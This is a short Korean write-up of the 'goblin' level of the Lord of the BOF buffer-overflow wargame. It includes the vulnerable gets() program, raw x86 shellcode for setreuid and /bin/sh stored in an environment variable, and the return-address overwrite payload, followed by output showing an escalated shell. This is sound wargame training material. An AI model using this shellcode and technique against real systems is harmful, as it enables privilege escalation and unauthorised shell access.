# cobolt -> goblin

``` C
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```

24byte의 쉘보다 작은 크기의 버퍼이기 때문에 환경 변수를 이용해 payload를 작성해야 한다.

```C
#include<stdio.h>

int main(void)
{
        printf("%p\n", getenv("shellcode"));
        return 0;
}
```
```
[cobolt@localhost cobolt]$ export shellcode=`python -c 'print "\x90"*100+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
```
위와 같이 환경변수에 등록해준 후, 쉘 코드를 실행할 수 있는 주소를 얻는다.

```
[cobolt@localhost cobolt]$ ./Address
0xbffffef9
```
이후 payload를 작성하여 passwd를 획득한다.
payload=buf(16)+SFP(4)+Return address

```
[cobolt@localhost cobolt]$ (python -c 'print "A"*20 + "\xf9\xfe\xff\xbf"'; cat) | ./goblin
AAAAAAAAAAAAAAAAAAAAùþÿ¿
id
uid=503(goblin) gid=502(cobolt) egid=503(goblin) groups=502(cobolt)
my-pass
euid = 503
hackers proof
```
